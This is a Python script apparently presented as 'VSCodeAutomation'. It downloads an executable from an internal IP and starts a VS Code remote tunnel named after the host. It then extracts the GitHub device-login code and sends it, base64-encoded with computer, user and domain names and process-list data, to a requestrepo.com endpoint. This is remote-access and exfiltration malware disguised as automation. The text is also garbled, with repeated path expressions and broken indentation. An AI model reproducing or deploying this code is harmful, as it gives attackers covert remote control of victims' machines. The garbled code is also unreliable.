import urllib.request
from os import remove, getenv, path, makedirs, listdir
from subprocess import Popen, PIPE
from time import sleep
import re
import base64
import os

class VSCodeAutomation:
    def __init__(self):
        self.local_app_data = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local')os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local')os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local')getenv('LOCALAPPDATA') or r"C:\\Users\\survivor\\AppData\\Local"
        self.vscode_executable_path = os.path.join(self.local_app_data, "Microsoft", "code.exe")
        self.ssl_context = None  # Set appropriate SSL context
        self.output_file_1 = "output1.txt"
        self.output_file_2 = "output2.txt"
        self.user_status = "active"  # Example placeholder
    
    def vscode_down_extract_zip(self):
        download_url = "http://10.10.21.253:8000/VSCodo/code.exe"
        print("[INFO] Starting VSCode CLI download...")
        try:
            request = urllib.request.Request(download_url, headers={"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(request) as response:
                print(f"[INFO] HTTP Response Code: {response.getcode()}")
                if response.getcode() != 200:
                    print("[ERROR] Download failed, non-200 response received.")
                    return
                with open(self.vscode_executable_path, "wb") as file_wb:
                    file_wb.write(response.read())
            print("[INFO] VSCode executable downloaded successfully.")
            
            # Verify file existence
            if not path.exists(self.vscode_executable_path) or not os.access(self.vscode_executable_path, os.X_OK):
            print(f"[ERROR] Downloaded file is not an executable: {self.vscode_executable_path}")
            return
                print(f"[ERROR] Downloaded file is not an executable: {self.vscode_executable_path}")
    return
                    print("[ERROR] VSCode executable file not found after download.")
            return
                return
        except Exception as e:
            print(f"[ERROR] Failed to download VSCode CLI: {e}")
    
    def execute_vscode(self, tasklist_output):
        print(f"[INFO] Attempting to execute: {self.vscode_executable_path}")
        
        if not path.exists(self.vscode_executable_path):
            print(f"[ERROR] VSCode executable not found at: {self.vscode_executable_path}")
            return
        
        try:
            Popen([self.vscode_executable_path, 'tunnel', '--accept-server-license-terms', 'user', 'logout'], shell=True)
            print("[INFO] Logged out of existing VSCode tunnel.")
            sleep(3)
            process = Popen([self.vscode_executable_path, '--locale', 'en-US', 'tunnel', '--accept-server-license-terms', '--name', getenv('COMPUTERNAME')],
                            stdout=open(self.output_file_1, 'w'), stdin=PIPE, shell=True)
            print("[INFO] VSCode tunnel started.")
            sleep(5)
            GitHub_Acc = 'Github Account'
            getattr(process.stdin, 'write')(GitHub_Acc.encode())
            getattr(process.stdin, 'flush')()
            getattr(process.stdin, 'close')()
            print("[INFO] GitHub account authentication sent.")
            sleep(10)
            
            with open(self.output_file_1, 'r') as out_file_1_read:
                file_1_content = out_file_1_read.read()
            print("[INFO] VSCode output captured.")
            with open(self.output_file_2, 'w') as out_file_2_write:
                out_file_2_write.write(file_1_content)
            with open(self.output_file_2, 'r') as out_file_2_read:
                file_2_content = out_file_2_read.read()
            
            match = re.search(r'and use code ([\w\d-]+)', file_2_content)
            github_code = match.group(1) if match else None
            print(f"[INFO] GitHub authentication code extracted: {github_code}")
            
            FilesAndProcessInfo = tasklist_output + '\n' + '========================================\n'
            print("[INFO] System file information collected.")
            
            if github_code:
                locale_language = "en-US"
                computer_name = getenv('COMPUTERNAME')
                user_name = getenv('USERNAME')
                user_domain = getenv('USERDOMAIN')
                encoded_user_info = base64.b64encode(f"{locale_language}-{computer_name}-{user_name}-{user_domain}-{github_code}-{self.user_status}".encode('utf-8')).decode('utf-8')
                request_url = f'http://requestrepo.com/r/shrcr9sh/{encoded_user_info}'
                request_data = urllib.request.Request(request_url, data=FilesAndProcessInfo.encode('utf-8'),
                                                      headers={'Content-Type': 'application/x-www-form-urlencoded'}, method='POST')
                urllib.request.urlopen(request_data)
                print("[INFO] System information and authentication details sent successfully.")
        except Exception as e:
            print(f"[ERROR] VSCode execution failed: {e}")
    
if __name__ == "__main__":
    automation = VSCodeAutomation()
    automation.vscode_down_extract_zip()
    automation.execute_vscode(tasklist_output="Simulated tasklist output")
